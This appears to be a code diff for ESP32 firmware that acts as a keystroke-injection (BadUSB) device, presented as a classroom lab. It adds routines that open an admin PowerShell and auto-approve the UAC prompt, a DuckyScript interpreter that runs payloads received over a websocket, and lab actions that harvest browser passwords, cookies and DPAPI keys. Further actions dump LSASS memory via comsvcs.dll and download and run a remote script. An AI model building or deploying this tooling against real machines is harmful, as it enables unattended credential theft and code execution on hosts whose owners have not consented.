@@ -163,6 +163,259 @@ static void labRunWinR(const char *action, const char *cmd, bool elevated = fals
 #endif
 }
 
+// =====================================================================
+// Lab helper, two-phase (used by browser harvest):
+//   Phase 1: open an ELEVATED PowerShell console
+//            (Win+R -> powershell -> Ctrl+Shift+Enter -> UAC -> Alt+Y)
+//   Phase 2: caller types the script INTO the open console, so all
+//            errors stay visible instead of dying silently in a
+//            one-shot Run dialog one-liner.
+// =====================================================================
+static void labOpenAdminPs(const char *tag)
+{
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(20);
+  Keyboard.releaseAll();
+  delay(800);
+  Keyboard.print("powershell");
+  delay(300);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  delay(20);
+  Keyboard.releaseAll();
+#if LAB_UAC_AUTOYES
+  delay(1500);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  delay(20);
+  Keyboard.releaseAll();
+  LOG("[Lab] %s: UAC auto-approved (Alt+Y)\n", tag);
+#endif
+  delay(3000); // elevated console window comes up
+}
+
+static void labTypeConsole(const char *script)
+{
+  Keyboard.print(script);
+  delay(300);
+  Keyboard.press(KEY_RETURN);
+  delay(20);
+  Keyboard.releaseAll();
+}
+
+// Open a plain (non-elevated) PowerShell console for commands that need no
+// admin — used by the decrypt button. Avoids the Run dialog entirely
+// (it truncates around ~261 chars).
+static void labOpenConsole(const char *tag)
+{
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(20);
+  Keyboard.releaseAll();
+  delay(800);
+  Keyboard.print("powershell");
+  delay(300);
+  Keyboard.press(KEY_RETURN);
+  delay(20);
+  Keyboard.releaseAll();
+  delay(2500); // console window comes up
+  LOG("[Lab] %s: console open\n", tag);
+}
+
+// =====================================================================
+// DuckyScript interpreter (Rubber Ducky v1 subset) for custom buttons.
+// Supported: REM / // comments, DELAY <ms>, DEFAULTDELAY <ms>,
+// STRING <text>, REPEAT <n>, and key lines — a single key or modifiers
+// plus a key (e.g. "GUI r", "CTRL SHIFT ENTER", "ENTER").
+// =====================================================================
+static uint8_t duckyKeyToken(String token)
+{
+  token.trim();
+  token.toUpperCase();
+  if (token.length() == 1)
+  {
+    char c = token[0];
+    if ((c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9'))
+      return (uint8_t)c;
+  }
+  if (token == "ENTER" || token == "RETURN")
+    return KEY_RETURN;
+  if (token == "ESC" || token == "ESCAPE")
+    return KEY_ESC;
+  if (token == "TAB")
+    return KEY_TAB;
+  if (token == "SPACE")
+    return KEY_SPACE;
+  if (token == "BACKSPACE")
+    return KEY_BACKSPACE;
+  if (token == "DELETE" || token == "DEL")
+    return KEY_DELETE;
+  if (token == "INSERT")
+    return KEY_INSERT;
+  if (token == "HOME")
+    return KEY_HOME;
+  if (token == "END")
+    return KEY_END;
+  if (token == "PAGEUP")
+    return KEY_PAGE_UP;
+  if (token == "PAGEDOWN")
+    return KEY_PAGE_DOWN;
+  if (token == "UP" || token == "UPARROW")
+    return KEY_UP_ARROW;
+  if (token == "DOWN" || token == "DOWNARROW")
+    return KEY_DOWN_ARROW;
+  if (token == "LEFT" || token == "LEFTARROW")
+    return KEY_LEFT_ARROW;
+  if (token == "RIGHT" || token == "RIGHTARROW")
+    return KEY_RIGHT_ARROW;
+  if (token == "CAPSLOCK")
+    return KEY_CAPS_LOCK;
+  if (token == "PRINTSCREEN")
+    return KEY_PRINT_SCREEN;
+  for (int f = 1; f <= 12; f++)
+    if (token == "F" + String(f))
+      return (uint8_t)(KEY_F1 + f - 1);
+  return 0;
+}
+
+static bool duckyIsModifier(String token, uint8_t &mod)
+{
+  token.trim();
+  token.toUpperCase();
+  if (token == "GUI" || token == "WINDOWS" || token == "WIN" ||
+      token == "META")
+  {
+    mod = KEY_LEFT_GUI;
+    return true;
+  }
+  if (token == "CTRL" || token == "CONTROL")
+  {
+    mod = KEY_LEFT_CTRL;
+    return true;
+  }
+  if (token == "SHIFT")
+  {
+    mod = KEY_LEFT_SHIFT;
+    return true;
+  }
+  if (token == "ALT")
+  {
+    mod = KEY_LEFT_ALT;
+    return true;
+  }
+  return false;
+}
+
+static void duckyRunLine(const String &line)
+{
+  if (line.startsWith("STRING"))
+  {
+    Keyboard.print(line.length() > 6 ? line.substring(7) : "");
+    return;
+  }
+  String tokens[8];
+  int tokenCount = 0;
+  int pos = 0;
+  while (pos <= (int)line.length() && tokenCount < 8)
+  {
+    int end = line.indexOf(' ', pos);
+    if (end < 0)
+      end = line.length();
+    String t = line.substring(pos, end);
+    t.trim();
+    if (t.length())
+      tokens[tokenCount++] = t;
+    pos = end + 1;
+    if (end == (int)line.length())
+      break;
+  }
+  uint8_t pressedMods[4];
+  int modCount = 0;
+  uint8_t key = 0;
+  int i = 0;
+  for (; i < tokenCount; i++)
+  {
+    uint8_t m;
+    if (duckyIsModifier(tokens[i], m) && modCount < 4)
+      pressedMods[modCount++] = m;
+    else
+    {
+      key = duckyKeyToken(tokens[i]);
+      i++;
+      break;
+    }
+  }
+  if (key == 0 || i != tokenCount)
+  {
+    LOG("[Ducky] Skipped unknown line\n");
+    return;
+  }
+  for (int m = 0; m < modCount; m++)
+    Keyboard.press(pressedMods[m]);
+  Keyboard.press(key);
+  delay(20);
+  Keyboard.releaseAll();
+}
+
+static void runDuckyScript(const String &script)
+{
+  LOG("[Ducky] Running %u chars\n", script.length());
+  int defaultDelay = 0;
+  String lastLine = "";
+  int pos = 0;
+  int commands = 0;
+  while (pos <= (int)script.length())
+  {
+    int end = script.indexOf('\n', pos);
+    if (end < 0)
+      end = script.length();
+    String line = script.substring(pos, end);
+    pos = end + 1;
+    line.trim();
+    if (line.isEmpty())
+      continue;
+    if (line.startsWith("//"))
+      continue;
+    if (line.startsWith("REM") &&
+        (line.length() == 3 || line[3] == ' '))
+      continue;
+    int sp = line.indexOf(' ');
+    String cmd = (sp < 0) ? line : line.substring(0, sp);
+    String rest = (sp < 0) ? "" : line.substring(sp + 1);
+    cmd.trim();
+    cmd.toUpperCase();
+    if (cmd == "DELAY")
+    {
+      delay(constrain(rest.toInt(), 1, 60000));
+      lastLine = line;
+      commands++;
+      continue;
+    }
+    if (cmd == "DEFAULTDELAY" || cmd == "DEFAULT_DELAY")
+    {
+      defaultDelay = constrain(rest.toInt(), 0, 10000);
+      continue;
+    }
+    if (cmd == "REPEAT")
+    {
+      int n = constrain(rest.toInt(), 1, 100);
+      for (int r = 1; r < n; r++)
+        duckyRunLine(lastLine);
+      commands++;
+      continue;
+    }
+    duckyRunLine(line);
+    lastLine = line;
+    commands++;
+    if (defaultDelay)
+      delay(defaultDelay);
+  }
+  Keyboard.releaseAll();
+  LOG("[Ducky] Done (%u commands)\n", commands);
+}
+
 static void vaultDeriveKey()
 {
   static const char pass[] = "PV-ESP32-Classroom-2026";
@@ -546,6 +799,8 @@ static bool quickActionValueValid(const String &rawType,
       return false;
     return v.length() > (unsigned)(colon + 1);
   }
+  if (type == "ducky")
+    return value.length() >= 3 && value.length() <= 1500;
   if (value.length() > 180)
     return false;
   if (type == "shortcut")
@@ -1057,6 +1312,16 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
       return;
     }
 
+    // --- DuckyScript payload (Rubber Ducky v1 subset) from a saved
+    // "ducky" quick action or the web keyboard payload box ---
+    if (msg.startsWith("DUCKY:"))
+    {
+      String script = msg.substring(6);
+      if (script.length() > 0)
+        runDuckyScript(script);
+      return;
+    }
+
     // --- Quick action "run": device-side Win+R typing at USB speed ---
     if (msg.startsWith("RUN:"))
     {
@@ -1221,13 +1486,42 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
       }
       else if (lab == "browser")
       {
-        // Educational lab demo (T1555.003): closes browsers to unlock the
-        // SQLite stores, then copies Login Data / Cookies / Local State to
-        // C:\LabOut\Browser. Collection only, nothing leaves the VM.
-        labRunWinR("browser/chrome", LAB_BROWSER_CHROME_CMD);
-        delay(1000);
-        labRunWinR("browser/edge", LAB_BROWSER_EDGE_CMD);
-        LOG("[Lab] Browser artifacts copied to C:\\LabOut\\Browser\n");
+        // Educational lab demo (T1555.003), two-phase elevated-console
+        // flow: 1) open admin PowerShell (UAC handled)  2) type the
+        // harvest script into that console. Closes browsers, copies
+        // Login Data / Cookies / Local State, Firefox logins.json +
+        // key4.db and the DPAPI Protect folder to C:\LabOut\Browser.
+        labOpenAdminPs("browser");
+        labTypeConsole(LAB_BROWSER_COLLECT_CMD);
+        delay(1500);
+        labTypeConsole(LAB_BROWSER_LIST_CMD);
+        LOG("[Lab] Browser harvest ran in elevated console\n");
+      }
+      else if (lab == "lsass")
+      {
+        // Educational lab demo (T1003.001): dumps live LSASS memory (all
+        // currently logged-in accounts, incl. domain creds + tickets) to
+        // C:\LabSAM\lsass.dmp via Windows' own comsvcs.dll MiniDump export.
+        // Elevated console, UAC handled. Most-monitored operation in
+        // Windows — pair with Sysmon EID 10 in the report.
+        labOpenAdminPs("lsass");
+        labTypeConsole(LAB_LSASS_CMD);
+        LOG("[Lab] LSASS dump -> C:\\LabSAM\\lsass.dmp\n");
+      }
+      else if (lab == "decrypt")
+      {
+        // Zero-touch finish (no elevation needed): open a plain console and
+        // type the download+run script there — the Run dialog would
+        // truncate this at ~261 chars.
+        labOpenConsole("decrypt");
+        labTypeConsole(LAB_DECRYPT_CMD);
+        LOG("[Lab] Decryptor fetched and run on VM\n");
+      }
+      else if (lab == "persistSl")
+      {
+        // Spare button — set the command in include/lab_commands.h
+        // (LAB_PERSISTSL_CMD). Empty = logs a reminder, types nothing.
+        labRunWinR("persistSl", LAB_PERSISTSL_CMD);
       }
 
       return;
